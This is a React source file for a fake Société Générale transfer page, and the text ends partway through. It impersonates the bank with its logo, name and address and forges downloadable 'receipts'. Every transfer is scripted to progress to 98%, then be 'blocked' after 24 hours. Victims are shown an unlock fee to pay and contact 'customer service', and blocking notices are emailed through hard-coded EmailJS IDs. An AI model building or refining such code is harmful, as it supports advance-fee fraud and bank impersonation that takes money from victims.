import React, { useState, useEffect } from 'react';
import {  Power, ChevronDown, ChevronUp, Plus, Trash2, CheckCircle, Loader, Clock, History, XCircle, AlertCircle, AlertTriangle, Download } from 'lucide-react';
import { useAuth } from '../context/AuthContext';
import { getMontantDeblocage } from '../services/UserService';

const VIREMENTS_STORAGE_KEY = 'virements:data';

const STATUT_VIREMENT = {
  EN_ATTENTE: 'en_attente',
  EN_COURS: 'en_cours',
  VALIDATION: 'validation',
  BLOQUE: 'bloque',
  ANNULE: 'annule'
};

const EMAIL_CONFIG = {
  SERVICE_ID: 'service_cjaxn39',
  USER_ID: 'njMn_oOGEC89lGj7j',
  TEMPLATES: {
    CONFIRMATION: 'template_o56ngdd',
    BLOCAGE: 'template_xd6542w'
  }
};

export default function VirementPage() {
  const { currentUser, setCurrentUser } = useAuth();
  const [currentPage, setCurrentPage] = useState('list');
  const [nextPage, setNextPage] = useState(null);
  const [showBeneficiaries, setShowBeneficiaries] = useState(true);
  const [selectedBeneficiary, setSelectedBeneficiary] = useState(null);
  const [amount, setAmount] = useState('');
  const [virements, setVirements] = useState([]);
  
  const soldeCompte = currentUser?.solde || 0;
  const numeroCompte = currentUser?.numeroCompte || currentUser?.username || '';
  
  const [beneficiaries, setBeneficiaries] = useState([
    {
      id: 1,
      nom: 'Van Butsele',
      prenom: 'Liege',
      iban: 'FR76 1751 5900 0004 1405 4735 344',
      email: 'van.butsele@example.com',
      bic: 'BNPAFRPP',
      type: 'SEPA'
    },
    {
      id: 2,
      nom: 'Lamar',
      prenom: 'Valerie',
      iban: 'FR55 2004 1010 0101 1249 0R02 138',
      email: 'valerie.lamar@example.com',
      bic: 'SOGEFRPP',
      type: 'SEPA'
    }
  ]);

  const [newBeneficiary, setNewBeneficiary] = useState({
    nom: '',
    prenom: '',
    iban: '',
    email: '',
    bic: ''
  });

  const loadVirements = () => {
    try {
      const data = localStorage.getItem(VIREMENTS_STORAGE_KEY);
      if (data) {
        return JSON.parse(data);
      }
      return [];
    } catch (error) {
      console.log('Aucun virement trouvé');
      return [];
    }
  };

  const saveVirements = (virements) => {
    try {
      localStorage.setItem(VIREMENTS_STORAGE_KEY, JSON.stringify(virements));
      return true;
    } catch (error) {
      console.error('Erreur sauvegarde virements:', error);
      return false;
    }
  };

  const chargerVirements = () => {
    if (!currentUser?.numeroCompte) return;
    
    console.log('📥 Chargement des virements pour:', currentUser.numeroCompte);
    const allVirements = loadVirements();
    const mesVirements = allVirements.filter(
      v => v.numeroCompte === currentUser.numeroCompte
    );
    
    console.log('📊 Virements trouvés:', mesVirements.length);
    const virementsTriees = mesVirements.sort(
      (a, b) => new Date(b.dateCreation) - new Date(a.dateCreation)
    );
    setVirements(virementsTriees);
  };

  const calculerProgression = (virement) => {
    const maintenant = new Date();
    const creation = new Date(virement.dateCreation);
    const blocagePrevue = new Date(virement.dateBlocagePrevue);
    
    const tempsEcoule = maintenant - creation;
    const tempsTotal = blocagePrevue - creation;
    
    let pourcentage = (tempsEcoule / tempsTotal) * 98;
    pourcentage = Math.floor(pourcentage);
    pourcentage = Math.max(0, Math.min(98, pourcentage));
    
    return pourcentage;
  };

     // ✅ CORRECTION de la fonctiondans VirementPage.js
// Remplacez votre fonction  actuelle par celle-ci :

      const envoyerNotificationBlocage = async (virement) => {
  try {
    const montantDeblocage = virement.montantDeblocage || 0;
    
    const templateParams = {
      to_email: virement.beneficiaire.email,
      beneficiary_name: `${virement.beneficiaire.prenom} ${virement.beneficiaire.nom}`,
     sender_name: virement.expediteur?.nom || virement.expediteurNom || 'Expéditeur',
      sender_iban: virement.numeroCompte,
      amount: virement.montant.toFixed(2),
      currency: virement.devise || 'EUR',
      iban: virement.beneficiaire.iban,
      bic: virement.beneficiaire.bic || 'N/A',
      transfer_id: virement.id,
      reference: virement.id,
      date_blocage: new Date().toLocaleString('fr-FR'),
      montant_deblocage: `${montantDeblocage.toFixed(2)} €`
    };

    console.log('🔍 DONNÉES ENVOYÉES:', templateParams);  // ✅ AJOUTEZ CETTE LIGNE ICI
    console.log('sender_name:', templateParams.sender_name);  // ✅ ET CETTE LIGNE AUSSI
    console.log('sender_iban:', templateParams.sender_iban);  // ✅ ET CELLE-CI
    console.log('reference:', templateParams.reference);  // ✅ ET CELLE-CI

    await fetch('https://api.emailjs.com/api/v1.0/email/send', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        service_id: 'service_cjaxn39',
        template_id: 'template_xd6542w',
        user_id: 'njMn_oOGEC89lGj7j',
        template_params: templateParams
      })
    });
    
    console.log('✅ Email de blocage envoyé');
  } catch (error) {
    console.error('❌ Erreur email blocage:', error);
  }
};

    

  const verifierEtMettreAJourVirements = () => {
    console.log('⏰ Vérification automatique...');
    const allVirements = loadVirements();
    let updated = false;

    const virementsUpdated = allVirements.map(v => {
      if ([STATUT_VIREMENT.BLOQUE, STATUT_VIREMENT.ANNULE].includes(v.statut)) {
        return v;
      }

      const maintenant = new Date();
      const blocagePrevue = new Date(v.dateBlocagePrevue);
      const nouveauPourcentage = calculerProgression(v);
      
      if (maintenant >= blocagePrevue) {
        console.log('🚫 BLOCAGE du virement', v.id);
        updated = true;
        
        envoyerNotificationBlocage(v);
        
        return {
          ...v,
          statut: STATUT_VIREMENT.BLOQUE,
          pourcentageProgression: 98,
          dateModification: new Date().toISOString(),
          historique: [
            ...(v.historique || []),
            {
              statut: STATUT_VIREMENT.BLOQUE,
              date: new Date().toISOString(),
              message: '🚫 VIREMENT BLOQUÉ - Délai de 1 minute écoulé. Contactez le service client.',
              pourcentage: 98
            }
          ]
        };
      }
      
      if (nouveauPourcentage !== v.pourcentageProgression) {
        updated = true;
        let nouveauStatut = v.statut;
        let message = '';
        
        if (nouveauPourcentage < 25) {
          nouveauStatut = STATUT_VIREMENT.EN_ATTENTE;
          message = '🔍 Vérification des informations bancaires';
        } else if (nouveauPourcentage < 50) {
          nouveauStatut = STATUT_VIREMENT.EN_COURS;
          message = '⚙️ Traitement bancaire en cours';
        } else if (nouveauPourcentage < 75) {
          nouveauStatut = STATUT_VIREMENT.EN_COURS;
          message = '📤 Transfert vers la banque bénéficiaire';
        } else if (nouveauPourcentage < 95) {
          nouveauStatut = STATUT_VIREMENT.VALIDATION;
          message = '✓ Validation finale en cours';
        } else {
          nouveauStatut = STATUT_VIREMENT.VALIDATION;
          message = '⏳ Dernières vérifications (blocage imminent)';
        }
        
        return {
          ...v,
          statut: nouveauStatut,
          pourcentageProgression: nouveauPourcentage,
          dateModification: new Date().toISOString(),
          historique: [
            ...(v.historique || []),
            {
              statut: nouveauStatut,
              date: new Date().toISOString(),
              message: message,
              pourcentage: nouveauPourcentage
            }
          ]
        };
      }
      
      return v;
    });

    if (updated) {
      saveVirements(virementsUpdated);
      chargerVirements();
      console.log('✅ Virements mis à jour');
    }
  };

  useEffect(() => {
    console.log('🔄 useEffect déclenché, currentUser:', currentUser?.numeroCompte);
    
    if (currentUser && currentUser.numeroCompte) {
      console.log('✅ Chargement des virements...');
      chargerVirements();
      
      const interval = setInterval(() => {
        verifierEtMettreAJourVirements();
      }, 5000);
      
      return () => {
        clearInterval(interval);
      };
    } else {
      console.log('❌ Pas d\'utilisateur connecté');
    }
  }, [currentUser?.numeroCompte]);

  const getStatutLibelle = (statut, pourcentage) => {
    switch (statut) {
      case STATUT_VIREMENT.EN_ATTENTE:
        return { label: `En attente (${pourcentage}%)`, color: 'blue', icon: 'Clock' };
      case STATUT_VIREMENT.EN_COURS:
        return { label: `En cours (${pourcentage}%)`, color: 'orange', icon: 'AlertCircle' };
      case STATUT_VIREMENT.VALIDATION:
        return { label: `Validation (${pourcentage}%)`, color: 'yellow', icon: 'AlertTriangle' };
      case STATUT_VIREMENT.BLOQUE:
        return { label: '🚫 BLOQUÉ (98%)', color: 'red', icon: 'XCircle' };
      case STATUT_VIREMENT.ANNULE:
        return { label: 'Annulé', color: 'gray', icon: 'XCircle' };
      default:
        return { label: 'Inconnu', color: 'gray', icon: 'AlertCircle' };
    }
  };

  const handleLogout = () => {
    window.location.href = '/login';
  };

  const showLoadingThenNavigate = (page) => {
    setNextPage(page);
    setCurrentPage('loading');
    setTimeout(() => {
      setCurrentPage(page);
      setNextPage(null);
    }, 1500);
  };

  const deleteBeneficiary = (id, e) => {
    e.stopPropagation();
    setBeneficiaries(beneficiaries.filter(b => b.id !== id));
  };

  const handleSelectBeneficiary = (beneficiary) => {
    setSelectedBeneficiary(beneficiary);
    showLoadingThenNavigate('amount');
  };

  const handleAddBeneficiary = () => {
    if (newBeneficiary.nom && newBeneficiary.prenom && newBeneficiary.iban && newBeneficiary.email && newBeneficiary.bic) {
      const newBen = {
        id: Date.now(),
        ...newBeneficiary,
        type: 'SEPA'
      };
      setBeneficiaries([...beneficiaries, newBen]);
      setSelectedBeneficiary(newBen);
      setNewBeneficiary({
        nom: '',
        prenom: '',
        iban: '',
        email: '',
        bic: ''
      });
      showLoadingThenNavigate('amount');
    }
  };

        // ✅ CORRECTION de la fonction handleConfirmAmount dans VirementPage.js
// Remplacez votre fonction handleConfirmAmount actuelle par celle-ci :

const handleConfirmAmount = async () => {
  console.log('=== DÉBUT handleConfirmAmount ===');
  const montantVirement = parseFloat(amount);
  
  if (!montantVirement || montantVirement <= 0) {
    alert('Veuillez saisir un montant valide');
    return;
  }

  if (montantVirement > soldeCompte) {
    alert('Solde insuffisant pour effectuer ce virement');
    return;
  }

  try {
    const allVirements = loadVirements();
    const maintenant = new Date();
    const blocageDans24h = new Date(maintenant.getTime() + 24 * 60 * 60 * 1000);
    
    const montantDeblocage = getMontantDeblocage(currentUser.username || currentUser.numeroCompte);

    const newVirement = {
      id: Date.now().toString(),
      numeroCompte: currentUser.numeroCompte,
      expediteurNom: currentUser.nom,  // ✅ Sera utilisé par VirementService
      beneficiaire: selectedBeneficiary,
      montant: montantVirement,
      devise: 'EUR',
      montantDeblocage: montantDeblocage || 50,
      dateCreation: maintenant.toISOString(),
      dateBlocagePrevue: blocageDans24h.toISOString(),
      statut: STATUT_VIREMENT.EN_ATTENTE,
      pourcentageProgression: 0,
      historique: [{
        date: maintenant.toISOString(),
        statut: STATUT_VIREMENT.EN_ATTENTE,
        message:  'Virement initié - Traitement en cours ',
        pourcentage: 0
      }]
    };

    console.log('💰 Montant de déblocage pour cet utilisateur:', montantDeblocage);
    
    allVirements.push(newVirement);
    saveVirements(allVirements);
    console.log('✅ Virement créé:', newVirement.id);
    console.log('⏰ Blocage prévu:', blocageDans24h.toLocaleString('fr-FR'));

    const newSolde = soldeCompte - montantVirement;
    setCurrentUser({ ...currentUser, solde: newSolde });

    try {
      // ✅ CORRECTION: Toutes les variables nécessaires sont ajoutées
      const templateParams = {
        to_email: selectedBeneficiary?.email,
        beneficiary_name: `${selectedBeneficiary?.prenom} ${selectedBeneficiary?.nom}`,
        sender_name: currentUser?.nom || 'Expéditeur',  // ✅ AJOUTÉ
        sender_iban: currentUser?.numeroCompte || numeroCompte,  // ✅ AJOUTÉ
        amount: montantVirement.toFixed(2),
        currency: 'EUR',  // ✅ AJOUTÉ
        iban: selectedBeneficiary?.iban,
        bic: selectedBeneficiary?.bic || 'N/A',  // ✅ AJOUTÉ
        transfer_id: newVirement.id,  // ✅ AJOUTÉ
        reference: newVirement.id,  // ✅ AJOUTÉ
        date: new Date().toLocaleDateString('fr-FR'),
        message: `✅ VIREMENT INITIÉ

Votre virement de ${montantVirement.toFixed(2)} EUR a été créé avec succès.

📋 Informations :
• Bénéficiaire : ${selectedBeneficiary?.prenom} ${selectedBeneficiary?.nom}
• IBAN : ${selectedBeneficiary?.iban}
• Montant : ${montantVirement.toFixed(2)} EUR

  console.log('⏰ Blocage prévu:', blocageDans24h.toLocaleString('fr-FR'));`
      };

      console.log('📧 Variables envoyées à EmailJS:', templateParams);

      await fetch('https://api.emailjs.com/api/v1.0/email/send', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          service_id: 'service_cjaxn39',
          template_id: 'template_o56ngdd',
          user_id: 'njMn_oOGEC89lGj7j',
          template_params: templateParams
        })
      });
      
      console.log('📧 Email de confirmation envoyé avec succès');
    } catch (error) {
      console.error('❌ Erreur email:', error);
    }

    chargerVirements();
    showLoadingThenNavigate('success');
  } catch (error) {
    console.error('❌ ERREUR:', error);
    alert('Erreur lors de la création du virement: ' + error.message);
  }
};


  const handleBackToList = () => {
    setCurrentPage('list');
    setSelectedBeneficiary(null);
    setAmount('');
    chargerVirements();
  };

  const annulerVirement = (virementId) => {
    const virement = virements.find(v => v.id === virementId);
    
    if (virement.statut === STATUT_VIREMENT.BLOQUE) {
      alert('Ce virement est bloqué. Veuillez contacter le service client.');
      return;
    }

    if (virement.statut === STATUT_VIREMENT.ANNULE) {
      alert('Ce virement est déjà annulé.');
      return;
    }

    if (window.confirm('Êtes-vous sûr de vouloir annuler ce virement ?')) {
      const allVirements = loadVirements();
      const index = allVirements.findIndex(v => v.id === virementId);
      
      if (index !== -1) {
        allVirements[index].statut = STATUT_VIREMENT.ANNULE;
        allVirements[index].historique.push({
          date: new Date().toISOString(),
          statut: STATUT_VIREMENT.ANNULE,
          message: 'Virement annulé par l\'utilisateur'
        });
        
        saveVirements(allVirements);
        
        const montant = virement.montant;
        const newSolde = soldeCompte + montant;
        setCurrentUser({ ...currentUser, solde: newSolde });
        
        chargerVirements();
        alert('Virement annulé avec succès. Le montant a été recrédité sur votre compte.');
      }
    }
  };

  const supprimerVirement = (virementId) => {
    if (window.confirm('Êtes-vous sûr de vouloir supprimer ce virement de l\'historique ?')) {
      const allVirements = loadVirements();
      const nouveauxVirements = allVirements.filter(v => v.id !== virementId);
      saveVirements(nouveauxVirements);
      chargerVirements();
    }
  };

  const getIconComponent = (iconName) => {
    const icons = {
      AlertCircle,
      Clock,
      AlertTriangle,
      XCircle,
      CheckCircle
    };
    return icons[iconName] || AlertCircle;
  };

  const getStatutClasses = (color) => {
    const classes = {
      blue: 'bg-blue-100 text-blue-700',
      orange: 'bg-orange-100 text-orange-700',
      yellow: 'bg-yellow-100 text-yellow-700',
      red: 'bg-red-100 text-red-700',
      green: 'bg-green-100 text-green-700',
      gray: 'bg-gray-100 text-gray-700'
    };
    return classes[color] || 'bg-gray-100 text-gray-700';
  };

  const telechargerRecu = (virement) => {
    const isBloque = virement.statut === STATUT_VIREMENT.BLOQUE;
    const montantDeblocage = virement.montantDeblocage || 0;
    
    const recuHTML = `<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Reçu de Virement - ${virement.id}</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Arial', sans-serif; padding: 40px; background: #f5f5f5; }
        .recu-container { max-width: 800px; margin: 0 auto; background: white; padding: 40px; border: 2px solid #e0e0e0; box-shadow: 0 4px 6px rgba(0,0,0,0.1); }
        .header { text-align: center; border-bottom: 3px solid #e60028; padding-bottom: 20px; margin-bottom: 30px; }
        .header h1 { color: #e60028; font-size: 28px; margin-bottom: 10px; }
        .header p { color: #666; font-size: 14px; }
        ${isBloque ? `
        .alert-blocage { background: #fee; border: 2px solid #e60028; border-radius: 8px; padding: 20px; margin-bottom: 30px; text-align: center; }
        .alert-blocage h2 { color: #e60028; font-size: 24px; margin-bottom: 10px; }
        .alert-blocage .montant-deblocage { font-size: 32px; font-weight: bold; color: #e60028; margin: 15px 0; }
        .alert-blocage p { color: #333; font-size: 14px; }
        ` : ''}
        .section { margin-bottom: 30px; }
        .section-title { font-size: 18px; font-weight: bold; color: #333; margin-bottom: 15px; padding-bottom: 10px; border-bottom: 2px solid #f0f0f0; }
        .info-row { display: flex; justify-content: space-between; padding: 12px 0; border-bottom: 1px solid #f0f0f0; }
        .info-label { color: #666; font-weight: 600; }
        .info-value { color: #333; font-weight: bold; text-align: right; }
        .montant-principal { font-size: 32px; color: #00a651; text-align: center; padding: 20px; background: #f0f9f4; border-radius: 8px; margin: 20px 0; }
        .statut-badge { display: inline-block; padding: 8px 16px; border-radius: 20px; font-weight: bold; font-size: 14px; }
        .statut-bloque { background: #fee; color: #e60028; border: 2px solid #e60028; }
        .statut-normal { background: #e3f2fd; color: #1976d2; border: 2px solid #1976d2; }
        .footer { margin-top: 40px; padding-top: 20px; border-top: 2px solid #f0f0f0; text-align: center; color: #666; font-size: 12px; }
        .historique { background: #f9f9f9; padding: 15px; border-radius: 8px; margin-top: 15px; }
        .historique-item { padding: 10px 0; border-bottom: 1px solid #e0e0e0; font-size: 13px; }
        .historique-item:last-child { border-bottom: none; }
        .historique-date { color: #666; font-size: 11px; }
        .contact-info { background: #fffbf0; border: 2px solid #ffc107; border-radius: 8px; padding: 20px; margin-top: 20px; text-align: center; }
        .contact-info h3 { color: #f57c00; margin-bottom: 10px; }
        .contact-info p { color: #666; font-size: 14px; line-height: 1.6; }
        @media print {
            body { background: white; padding: 0; }
            .recu-container { box-shadow: none; border: none; }
        }
    </style>
</head>
<body>
    <div class="recu-container">
        <div class="header">
            <h1>🏦 SOCIÉTÉ GÉNÉRALE</h1>
            <p>Reçu de Virement International</p>
            <p style="margin-top: 5px; font-weight: bold;">N° ${virement.id}</p>
        </div>

        ${isBloque ? `
        <div class="alert-blocage">
            <h2>⚠️ VIREMENT BLOQUÉ</h2>
            <div class="montant-deblocage">${montantDeblocage.toFixed(2)} €</div>
            <p><strong>Montant requis pour débloquer ce virement</strong></p>
            <p style="margin-top: 10px;">Le délai de traitement a expiré. Veuillez contacter notre service client.</p>
        </div>
        ` : ''}

        <div class="section">
            <div class="section-title">📊 Statut du Virement</div>
            <div style="text-align: center; padding: 20px 0;">
                <span class="statut-badge ${isBloque ? 'statut-bloque' : 'statut-normal'}">
                    ${isBloque ? '🚫 BLOQUÉ À 98%' : getStatutLibelle(virement.statut, virement.pourcentageProgression).label}
                </span>
            </div>
        </div>

        <div class="montant-principal">${virement.montant.toFixed(2)} ${virement.devise}</div>

        <div class="section">
            <div class="section-title">👤 Informations de l'Expéditeur</div>
            <div class="info-row">
                <span class="info-label">Nom</span>
                <span class="info-value">${virement.expediteurNom || currentUser?.nom || 'N/A'}</span>
            </div>
            <div class="info-row">
                <span class="info-label">Numéro de compte</span>
                <span class="info-value">${virement.numeroCompte}</span>
            </div>
        </div>

        <div class="section">
            <div class="section-title">👥 Informations du Bénéficiaire</div>
            <div class="info-row">
                <span class="info-label">Nom complet</span>
                <span class="info-value">${virement.beneficiaire.prenom} ${virement.beneficiaire.nom}</span>
            </div>
            <div class="info-row">
                <span class="info-label">IBAN</span>
                <span class="info-value">${virement.beneficiaire.iban}</span>
            </div>
            <div class="info-row">
                <span class="info-label">BIC</span>
                <span class="info-value">${virement.beneficiaire.bic || 'N/A'}</span>
            </div>
            <div class="info-row">
                <span class="info-label">Email</span>
                <span class="info-value">${virement.beneficiaire.email}</span>
            </div>
        </div>

        <div class="section">
            <div class="section-title">📅 Dates et Détails</div>
            <div class="info-row">
                <span class="info-label">Date de création</span>
                <span class="info-value">${new Date(virement.dateCreation).toLocaleString('fr-FR')}</span>
            </div>
           
            ${isBloque ? `
            <div class="info-row">
                <span class="info-label">Date de blocage</span>
                <span class="info-value">${new Date(virement.dateBlocagePrevue).toLocaleString('fr-FR')}</span>
            </div>
            ` : ''}
        </div>

        <div class="footer">
            <p><strong>SOCIÉTÉ GÉNÉRALE</strong></p>
            <p>29 Boulevard Haussmann, 75009 Paris, France</p>
            <p style="margin-top: 10px;">Document généré le ${new Date().toLocaleString('fr-FR')}</p>
            <p style="margin-top: 5px; font-size: 10px;">Ce document est une preuve de transaction. Conservez-le précieusement.</p>
        </div>
    </div>
</body>
</html>`;

    const blob = new Blob([recuHTML], { type: 'text/html' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = `Recu_Virement_${virement.id}_${new Date().toISOString().split('T')[0]}.html`;
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
    URL.revokeObjectURL(url);
  };

  if (currentPage === 'loading') {
    return (
      <div className="min-h-screen bg-white flex flex-col">
        <div className="fixed top-0 left-0 right-0 bg-gray-100 py-3 flex justify-center border-b z-50">
          <img 
            src="images/logo sg.jpg" 
            alt="Société Générale" 
            className="h-12 object-contain"
          />
        </div>

        <div className="pt-20 px-4 py-6">
          <h2 className="text-xl font-bold text-gray-900 mb-10">Virement & Bénéficiaires</h2>
          
          <div className="flex flex-col items-center justify-center mt-28">
            <Loader className="w-20 h-20 text-gray-800 animate-spin mb-6" />
            <p className="text-lg text-gray-700">Un instant ...</p>
          </div>
        </div>
      </div>
    );
  }

  if (currentPage === 'list') {
    return (
      <div className="min-h-screen bg-gray-50">
        <header className="bg-white shadow-sm fixed top-0 left-0 right-0 z-50">
          <div className="max-w-5xl mx-auto px-4 py-3 flex items-center justify-between">
           
            
            <div className="hidden md:block w-12"></div>
            
            <img 
              src="images/logo sg.jpg" 
              alt="Société Générale" 
              className="h-12 object-contain"
            />
            
            <button 
              onClick={handleLogout}
              className="w-12 h-12 bg-red-600 rounded-full flex items-center justify-center hover:bg-red-500 transition"
            >
              <Power className="w-7 h-7 text-white" />
            </button>
          </div>
        </header>

        <main className="max-w-5xl mx-auto px-4 py-6 pt-20">
          <h1 className="text-2xl font-bold mb-6">Faire un virement</h1>

          <div className="bg-white py-5 px-4 mb-6 shadow-sm">
            <h2 className="text-xl font-semibold text-center">VIREMENTS INTERNATIONAUX</h2>
          </div>

          <div className="mb-6">
            <h3 className="text-lg font-semibold mb-3">Depuis quel compte ?</h3>
            <div className="bg-white border-l-4 border-teal-500 shadow-sm p-3 flex items-center justify-between">
              <div>
                <div className="font-semibold mb-1 text-sm">Compte</div>
                <div className="text-gray-600 text-xs">{numeroCompte}</div>
              </div>
              <div className="flex items-center gap-3">
                <span className="text-lg font-semibold">{soldeCompte.toLocaleString('fr-FR', { minimumFractionDigits: 2, maximumFractionDigits: 2 })} €</span>
                <ChevronDown className="w-5 h-5" />
              </div>
            </div>
          </div>

          <div className="mb-6">
            <h3 className="text-lg font-semibold mb-3">Vers quel bénéficiaire ?</h3>
            
            <div className="bg-white shadow-sm">
              <button 
                onClick={() => setShowBeneficiaries(!showBeneficiaries)}
                className="w-full p-3 flex items-center justify-end border-b"
              >
                {showBeneficiaries ? <ChevronUp className="w-5 h-5" /> : <ChevronDown className="w-5 h-5" />}
              </button>

              {showBeneficiaries && (
                <div className="p-4">
                  <button 
                    onClick={() => showLoadingThenNavigate('addBeneficiary')}
                    className="flex items-center gap-2 text-red-500 font-semibold mb-5 hover:text-red-600 text-sm"
                  >
                    <Plus className="w-5 h-5" />
                    <span>Ajouter un bénéficiaire</span>
                  </button>

                  <div className="mb-3">
                    <span className="font-semibold text-sm">BÉNÉFICIAIRE</span>                   
                    <span className="font-semibold text-sm"> ZONE SEPA DONT FRANCE</span>
                  </div>

                  <div className="space-y-2">
                    {beneficiaries.map((beneficiary) => (
                      <div 
                        key={beneficiary.id}
                        onClick={() => handleSelectBeneficiary(beneficiary)}
                        className="border border-gray-300 rounded p-3 flex items-center justify-between hover:bg-gray-50 cursor-pointer"
                      >
                        <div>
                          <div className="font-semibold mb-1 text-sm">{beneficiary.prenom} {beneficiary.nom}</div>
                          <div className="text-gray-600 text-xs">{beneficiary.iban}</div>
                        </div>
                        <button 
                          onClick={(e) => deleteBeneficiary(beneficiary.id, e)}
                          className="text-gray-400 hover:text-red-500"
                        >
                          <Trash2 className="w-4 h-4" />
                        </button>
                      </div>
                    ))}
                  </div>
                </div>
              )}
            </div>
          </div>

          <div className="mt-6">
            <h3 className="text-lg font-semibold mb-3 flex items-center gap-2">
              <History className="w-5 h-5" />
              Historique des virements ({virements.length})
            </h3>
            
            <div className="bg-white shadow-sm p-4">
              {virements.length === 0 ? (
                <div className="text-center py-12 text-gray-500">
                  <History className="w-20 h-20 mx-auto mb-4 text-gray-300" />
                  <p className="text-xl font-semibold mb-2">Aucun virement pour le moment</p>
                  <p className="text-sm">Vos virements apparaîtront ici après leur création</p>
                </div>
              ) : (
                <div className="space-y-3">
                  {virements.map((virement) => {
                    const statutInfo = getStatutLibelle(virement.statut, virement.pourcentageProgression);
                    const StatusIcon = getIconComponent(statutInfo.icon);
                    const peutAnnuler = virement.statut !== STATUT_VIREMENT.ANNULE && virement.statut !== STATUT_VIREMENT.BLOQUE;
                    
                    return (
                      <div 
                        key={virement.id}
                        className={`border-2 rounded-lg p-4 hover:shadow-md transition ${
                          virement.statut === STATUT_VIREMENT.BLOQUE ? 'border-red-300 bg-red-50' : 'border-gray-200'
                        }`}
                      >
                        <div className="flex items-start justify-between mb-3">
                          <div className="flex-1">
                            <div className="font-semibold text-base mb-1">
                              {virement.beneficiaire.prenom} {virement.beneficiaire.nom}
                            </div>
                            <div className="text-gray-600 text-xs mb-1">
                              {virement.beneficiaire.iban}
                            </div>
                            <div className="text-gray-500 text-xs">
                              {new Date(virement.dateCreation).toLocaleDateString('fr-FR')} à {new Date(virement.dateCreation).toLocaleTimeString('fr-FR', { hour: '2-digit', minute: '2-digit' })}
                            </div>
                          </div>
                          <div className="text-right">
                            <div className="font-bold text-xl text-emerald-600 mb-2">
                              {virement.montant.toLocaleString('fr-FR', { minimumFractionDigits: 2 })} €
                            </div>
                          </div>
                        </div>
                        
                        {virement.statut !== STATUT_VIREMENT.ANNULE && (
                          <div className="mb-3">
                            <div className="flex justify-between text-xs text-gray-600 mb-1">
                              <span>Progression</span>
                              <span>{virement.pourcentageProgression}%</span>
                            </div>
                            <div className="w-full bg-gray-200 rounded-full h-2">
                              <div 
                                className={`h-2 rounded-full transition-all duration-500 ${
                                  virement.statut === STATUT_VIREMENT.BLOQUE ? 'bg-red-600' :
                                  virement.statut === STATUT_VIREMENT.VALIDATION ? 'bg-yellow-600' :
                                  virement.statut === STATUT_VIREMENT.EN_COURS ? 'bg-orange-600' :
                                  'bg-blue-600'
                                }`}
                                style={{ width: `${virement.pourcentageProgression}%` }}
                              ></div>
                            </div>
                          </div>
                        )}
                        
                        <div className="flex items-center justify-between">
                          <span className={`inline-flex items-center gap-1 px-3 py-1 rounded-full text-xs font-semibold ${getStatutClasses(statutInfo.color)}`}>
                            <StatusIcon className="w-4 h-4" />
                            {statutInfo.label}
                          </span>
                          
                          <div className="flex gap-2">
                            <button
                              onClick={() => telechargerRecu(virement)}
                              className="px-3 py-1 bg-green-500 text-white text-xs rounded hover:bg-green-600 transition flex items-center gap-1"
                            >
                              <Download className="w-3 h-3" />
                              Reçu
                            </button>
                            {peutAnnuler && (
                              <button
                                onClick={() => annulerVirement(virement.id)}
                                className="px-3 py-1 bg-orange-500 text-white text-xs rounded hover:bg-orange-600 transition"
                              >
                                Annuler
                              </button>
                            )}
                            <button
                              onClick={() => supprimerVirement(virement.id)}
                              className="px-3 py-1 bg-red-500 text-white text-xs rounded hover:bg-red-600 transition"
                            >
                              Supprimer
                            </button>
                          </div>
                        </div>
                        
                        {virement.statut === STATUT_VIREMENT.BLOQUE && (
                          <div className="mt-3 p-3 bg-red-100 border border-red-300 rounded text-xs">
                            <p className="font-semibold text-red-800 mb-1">⚠️ Virement bloqué</p>
                            <p className="text-red-700">Le délai de traitement est écoulé. Veuillez contacter le service client pour déblocage.</p>
                            <p className="text-red-800 font-bold mt-2">Montant de déblocage: {virement.montantDeblocage?.toFixed(2) || '50.00'} €</p>
                          </div>
                        )}
                      </div>
                    );
                  })}
                </div>
              )}
            </div>
          </div>
        </main>
      </div>
    );
  }

  if (currentPage === 'addBeneficiary') {
    return (
      <div className="min-h-screen bg-white flex flex-col">
        <div className="fixed top-0 left-0 right-0 bg-gray-100 py-3 flex justify-center border-b z-50">
          <img 
            src="images/logo sg.jpg" 
            alt="Société Générale" 
            className="h-12 object-contain"
          />
        </div>

        <div className="pt-20 px-4 py-6 flex justify-center">
          <div className="w-full max-w-md">
            <h2 className="text-xl font-bold text-gray-900 mb-6 text-center">Ajouter un bénéficiaire</h2>
            
            <div className="space-y-4">
              <div>
                <label className="block text-sm font-semibold text-gray-700 mb-1 text-center">Nom</label>
                <input 
                  type="text"
                  value={newBeneficiary.nom}
                  onChange={(e) => setNewBeneficiary({...newBeneficiary, nom: e.target.value})}
                  className="w-full border border-gray-300 rounded px-3 py-2 text-center"
                  placeholder="Nom du bénéficiaire"
                />
              </div>

              <div>
                <label className="block text-sm font-semibold text-gray-700 mb-1 text-center">Prénom</label>
                <input 
                  type="text"
                  value={newBeneficiary.prenom}
                  onChange={(e) => setNewBeneficiary({...newBeneficiary, prenom: e.target.value})}
                  className="w-full border border-gray-300 rounded px-3 py-2 text-center"
                  placeholder="Prénom du bénéficiaire"
                />
              </div>

              <div>
                <label className="block text-sm font-semibold text-gray-700 mb-1 text-center">IBAN</label>
                <input 
                  type="text"
                  value={newBeneficiary.iban}
                  onChange={(e) => setNewBeneficiary({...newBeneficiary, iban: e.target.value})}
                  className="w-full border border-gray-300 rounded px-3 py-2 text-center"
                  placeholder="FR76 1234 5678 9012 3456 7890 123"
                />
              </div>

              <div>
                <label className="block text-sm font-semibold text-gray-700 mb-1 text-center">Email</label>
                <input 
                  type="email"
                  value={newBeneficiary.email}
                  onChange={(e) => setNewBeneficiary({...newBeneficiary, email: e.target.value})}
                  className="w-full border border-gray-300 rounded px-3 py-2 text-center"
                  placeholder="email@example.com"
                />
              </div>

              <div>
                <label className="block text-sm font-semibold text-gray-700 mb-1 text-center">BIC</label>
                <input 
                  type="text"
                  value={newBeneficiary.bic}
                  onChange={(e) => setNewBeneficiary({...newBeneficiary, bic: e.target.value})}
                  className="w-full border border-gray-300 rounded px-3 py-2 text-center"
                  placeholder="BNPAFRPP"
                />
              </div>
            </div>

            <div className="flex gap-3 mt-8">
              <button
